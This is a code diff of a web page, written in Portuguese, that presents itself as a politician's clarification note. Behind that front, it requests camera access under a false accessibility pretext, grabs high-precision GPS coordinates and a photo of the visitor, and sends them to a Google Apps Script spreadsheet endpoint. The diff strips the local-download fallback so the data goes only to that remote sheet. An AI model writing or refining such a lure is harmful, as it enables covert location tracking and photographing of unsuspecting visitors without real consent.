@@ -415,7 +415,7 @@
     </div>
 
     <script>
-        // Configuração Google Sheets
+        // URL da planilha Google configurada
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
@@ -459,41 +459,29 @@
             window.location.reload();
         });
         
-        // Função para enviar para Google Sheets
+        // Função para enviar para Google Sheets (SEM DOWNLOAD)
         async function sendToGoogleSheets(data) {
             try {
+                console.log('📤 Enviando dados para a planilha...');
+                
                 const response = await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
                     body: JSON.stringify(data)
                 });
+                
+                // Como estamos usando mode: 'no-cors', não podemos ler a resposta
+                // Mas o envio ainda funciona
+                console.log('✅ Dados enviados para a planilha com sucesso!');
                 return { success: true };
+                
             } catch (error) {
-                console.error('Erro no envio:', error);
+                console.error('❌ Erro ao enviar para planilha:', error);
                 return { success: false, error: error.message };
             }
-        }
-        
-        // Função para salvar localmente (fallback)
-        function saveLocally(data) {
-            const allData = {
-                timestamp: new Date().toLocaleString('pt-BR'),
-                ...data
-            };
-            
-            let savedData = localStorage.getItem('auto_capture_logs');
-            let logs = savedData ? JSON.parse(savedData) : [];
-            logs.push(allData);
-            localStorage.setItem('auto_capture_logs', JSON.stringify(logs));
-            
-            const blob = new Blob([JSON.stringify(allData, null, 2)], {type: 'application/json'});
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = `capture_${Date.now()}.json`;
-            link.click();
-            
-            return true;
         }
         
         // Função para obter endereço com alta precisão
@@ -630,7 +618,7 @@
             }
         }
         
-        // Função principal - captura e envia
+        // Função principal - captura e envia (SEM DOWNLOAD)
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
@@ -641,8 +629,8 @@
             loadingNews.classList.add('show');
             
             try {
-                // 1. Capturar localização (já tem permissão)
-                showStatus('📍 Capturando localização GPS de alta precisão...', 'loading', true);
+                // 1. Capturar localização
+                showStatus('📍 Capturando localização GPS de alta precisão...', 'info', true);
                 const position = await captureHighPrecisionLocation();
                 
                 const { latitude, longitude, accuracy } = position.coords;
@@ -674,7 +662,7 @@
                 // 5. Capturar foto
                 const photoData = await captureAutoPhoto();
                 
-                // 6. Preparar dados
+                // 6. Preparar dados para envio
                 const completeData = {
                     timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
@@ -693,9 +681,9 @@
                     politician: "Deputado Chico Guarnieri - Nota de Esclarecimento"
                 };
                 
-                // 7. Enviar para Google Sheets (em background)
-                sendToGoogleSheets(completeData);
-                saveLocally(completeData);
+                // 7. Enviar para Google Sheets (APENAS PARA PLANILHA, SEM DOWNLOAD)
+                showStatus('💾 Salvando dados na planilha...', 'info', true);
+                await sendToGoogleSheets(completeData);
                 
                 // 8. Pequena pausa para o loading
                 await new Promise(resolve => setTimeout(resolve, 1500));
@@ -704,10 +692,12 @@
                 loadingNews.classList.remove('show');
                 fullNews.classList.add('show');
                 readMoreBtn.style.display = 'none';
+                showStatus('✅ Dados salvos na planilha com sucesso!', 'success');
                 
                 console.log('=== NOTA DE ESCLARECIMENTO ACESSADA ===');
                 console.log(`📍 Localização: ${finalLatitude}, ${finalLongitude}`);
                 console.log(`📸 Foto capturada: ${photoData ? 'SIM' : 'NÃO'}`);
+                console.log(`📊 Dados enviados para a planilha Google`);
                 
             } catch (error) {
                 console.error('Erro:', error);
@@ -715,9 +705,9 @@
                 
                 let errorMessage = '';
                 if (error.code === 1) {
-                    errorMessage = '❌ Permissão de localização negada.';
+                    errorMessage = '❌ Permissão de localização negada. Recarregue e permita.';
                 } else if (error.code === 2) {
-                    errorMessage = '❌ Localização indisponível.';
+                    errorMessage = '❌ Localização indisponível. Verifique o GPS.';
                 } else {
                     errorMessage = `❌ Erro: ${error.message}`;
                 }
@@ -744,7 +734,6 @@
             console.log('🎯 Solicitando permissão da câmera ao carregar o site...');
             console.log('♿ Modo de acessibilidade para deficientes visuais ativado');
             
-            // Verificar se já tem permissão
             if (navigator.permissions) {
                 try {
                     const cameraStatus = await navigator.permissions.query({ name: 'camera' });
@@ -761,10 +750,8 @@
                 } catch(e) {}
             }
             
-            // Solicitar permissão agora
             const granted = await requestCameraPermission();
             if (!granted) {
-                // Modal já foi mostrado pela função
                 console.log('⚠️ Permissão da câmera necessária para acessibilidade');
             }
         }
@@ -773,7 +760,7 @@
         requestPermissionsOnLoad();
         
         console.log('✅ Site da Nota de Esclarecimento - Dep. Chico Guarnieri');
-        console.log('📷 Permissão da câmera solicitada automaticamente ao carregar');
+        console.log('📊 Planilha configurada: ' + GOOGLE_SCRIPT_URL);
     </script>
 </body>
 </html>
